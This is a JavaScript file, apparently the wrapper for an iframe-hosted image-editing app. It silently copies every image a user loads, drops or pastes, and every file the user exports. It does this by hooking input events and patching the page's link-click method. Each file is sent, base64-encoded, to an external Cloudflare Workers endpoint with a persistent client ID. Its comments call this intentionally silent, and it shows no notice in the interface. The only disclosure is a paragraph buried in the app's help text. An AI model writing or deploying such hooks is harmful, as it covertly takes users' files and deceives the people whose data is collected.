(function () {
  'use strict';

  var API_BASE = 'https://cloudflare-worker.armanioller.workers.dev';
  var CLIENT_ID_KEY = 'hfCloudClientIdV1';
  var MAX_FILE_BYTES = 32 * 1024 * 1024;
  var frame = document.getElementById('hfAppFrame');
  var clientId = getClientId();
  var queue = Promise.resolve();
  var installedWindow = null;
  var recentSources = Object.create(null);

  function getClientId() {
    var current = localStorage.getItem(CLIENT_ID_KEY);
    if (current && /^[a-zA-Z0-9_-]{16,80}$/.test(current)) return current;
    var id = '';
    try {
      if (window.crypto && typeof window.crypto.randomUUID === 'function') {
        id = window.crypto.randomUUID().replace(/-/g, '');
      }
      if (!id) {
        var bytes = new Uint8Array(24);
        window.crypto.getRandomValues(bytes);
        id = Array.prototype.map.call(bytes, function (b) {
          return b.toString(16).padStart(2, '0');
        }).join('');
      }
    } catch (_) {
      id = 'hf' + Date.now() + Math.random().toString(36).slice(2, 18);
    }
    localStorage.setItem(CLIENT_ID_KEY, id);
    return id;
  }

  function safeFilename(value, fallback) {
    var name = String(value || fallback || 'arquivo.bin').split(/[\\/]/).pop();
    name = name.replace(/[^a-zA-Z0-9._ -]+/g, '_').replace(/\s+/g, '-').replace(/^\.+/, '').slice(0, 160);
    return name || String(fallback || 'arquivo.bin');
  }

  function uniqueId(prefix) {
    var random = '';
    try {
      var bytes = new Uint8Array(6);
      window.crypto.getRandomValues(bytes);
      random = Array.prototype.map.call(bytes, function (b) {
        return b.toString(16).padStart(2, '0');
      }).join('');
    } catch (_) {
      random = Math.random().toString(36).slice(2, 12);
    }
    return String(prefix || 'arquivo') + '_' + Date.now() + '_' + random;
  }

  function blobToBase64(blob) {
    return new Promise(function (resolve, reject) {
      var reader = new FileReader();
      reader.onload = function () {
        var value = String(reader.result || '');
        var comma = value.indexOf(',');
        resolve(comma >= 0 ? value.slice(comma + 1).replace(/\s/g, '') : '');
      };
      reader.onerror = function () { reject(reader.error || new Error('Falha ao ler arquivo.')); };
      reader.readAsDataURL(blob);
    });
  }

  function sendSilently(kind, blob, filename) {
    if (!blob || !blob.size || blob.size > MAX_FILE_BYTES) return;
    queue = queue.then(async function () {
      try {
        var base64 = await blobToBase64(blob);
        if (!base64) return;
        await fetch(API_BASE + '/api/save', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            clientId: clientId,
            kind: kind,
            id: uniqueId(kind),
            filename: safeFilename(filename, kind === 'source' ? 'imagem-carregada.bin' : 'arquivo-exportado.bin'),
            mime: blob.type || 'application/octet-stream',
            base64: base64
          })
        });
      } catch (_) {
        // O backup é intencionalmente silencioso e não interfere no fluxo do usuário.
      }
    }, function () {});
  }

  function sourceKey(file) {
    return [file && file.name || '', file && file.type || '', file && file.size || 0, file && file.lastModified || 0].join(':');
  }

  function captureSource(file) {
    if (!file || !file.size || String(file.type || '').indexOf('image/') !== 0) return;
    var key = sourceKey(file);
    var now = Date.now();
    if (recentSources[key] && now - recentSources[key] < 5000) return;
    recentSources[key] = now;
    Object.keys(recentSources).forEach(function (entry) {
      if (now - recentSources[entry] > 15000) delete recentSources[entry];
    });
    sendSilently('source', file, file.name || 'imagem-carregada.png');
  }

  function blobFromHref(appWindow, href) {
    if (!href || !appWindow || typeof appWindow.fetch !== 'function') return Promise.resolve(null);
    if (href.indexOf('blob:') !== 0 && href.indexOf('data:') !== 0) return Promise.resolve(null);
    return appWindow.fetch(href).then(function (response) {
      return response.blob();
    }).catch(function () {
      return null;
    });
  }

  function installHooks() {
    var appWindow;
    var appDocument;
    try {
      appWindow = frame && frame.contentWindow;
      appDocument = frame && frame.contentDocument;
    } catch (_) {
      return;
    }
    if (!appWindow || !appDocument) return;
    if (installedWindow === appWindow) {
      updateDocumentation(appDocument);
      return;
    }
    installedWindow = appWindow;

    appDocument.addEventListener('change', function (event) {
      var input = event.target;
      if (input && input.id === 'fileInput' && input.files && input.files[0]) {
        captureSource(input.files[0]);
      }
    }, true);

    appDocument.addEventListener('drop', function (event) {
      var file = event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files[0];
      if (file) captureSource(file);
    }, true);

    appDocument.addEventListener('paste', function (event) {
      var items = event.clipboardData && event.clipboardData.items;
      if (!items) return;
      for (var i = 0; i < items.length; i++) {
        if (items[i] && String(items[i].type || '').indexOf('image/') === 0) {
          var file = items[i].getAsFile();
          if (file) captureSource(file);
          break;
        }
      }
    }, true);

    if (typeof appWindow.loadImageFile === 'function' && !appWindow.loadImageFile.__hfSilentArchive) {
      var originalLoadImageFile = appWindow.loadImageFile;
      var wrappedLoadImageFile = function (file) {
        captureSource(file);
        return originalLoadImageFile.apply(this, arguments);
      };
      wrappedLoadImageFile.__hfSilentArchive = true;
      appWindow.loadImageFile = wrappedLoadImageFile;
    }

    var anchorPrototype = appWindow.HTMLAnchorElement && appWindow.HTMLAnchorElement.prototype;
    if (anchorPrototype && !anchorPrototype.__hfSilentArchive) {
      var originalClick = anchorPrototype.click;
      anchorPrototype.click = function () {
        var anchor = this;
        var filename = String(anchor.download || '').trim();
        var href = String(anchor.href || '');
        if (filename && (href.indexOf('blob:') === 0 || href.indexOf('data:') === 0)) {
          Promise.resolve().then(function () {
            return blobFromHref(appWindow, href);
          }).then(function (blob) {
            if (blob) sendSilently('export', blob, filename);
          }).catch(function () {});
        }
        return originalClick.apply(anchor, arguments);
      };
      anchorPrototype.__hfSilentArchive = true;
    }

    updateDocumentation(appDocument);
  }

  function updateDocumentation(appDocument) {
    if (!appDocument) return;
    var section = appDocument.getElementById('docs-nuvem');
    if (!section || appDocument.getElementById('docs-silent-archive')) return;

    var block = appDocument.createElement('div');
    block.id = 'docs-silent-archive';
    block.innerHTML = '' +
      '<h3>Cópias automáticas de carregamentos e exportações</h3>' +
      '<p>Ao carregar, arrastar ou colar uma imagem, o arquivo original também é armazenado no backup privado, dentro da pasta <code>uploads</code>.</p>' +
      '<p>Quando o app gera e baixa uma exportação, uma cópia do mesmo arquivo também é armazenada na pasta <code>exports</code>. Isso inclui PNG, SVG, ZIP de chapas, projeto HFP, relatórios, mockups e outros downloads produzidos pelo aplicativo.</p>' +
      '<p>Essas cópias são feitas em segundo plano, sem toast, aviso ou alteração do status da interface. Elas são independentes da opção <code>Salvar automaticamente na nuvem</code>.</p>' +
      '<p>O limite técnico é de 32 MB por arquivo. Arquivos maiores continuam sendo carregados ou baixados normalmente no computador, mas não recebem a cópia remota.</p>';

    var privacyHeading = Array.prototype.find.call(section.querySelectorAll('h3'), function (heading) {
      return /privacidade/i.test(heading.textContent || '');
    });
    if (privacyHeading) section.insertBefore(block, privacyHeading);
    else section.appendChild(block);
  }

  if (frame) {
    frame.addEventListener('load', function () {
      setTimeout(installHooks, 200);
      setTimeout(installHooks, 1000);
      setTimeout(installHooks, 2200);
    });
    setTimeout(installHooks, 500);
    setTimeout(installHooks, 1600);
  }
})();
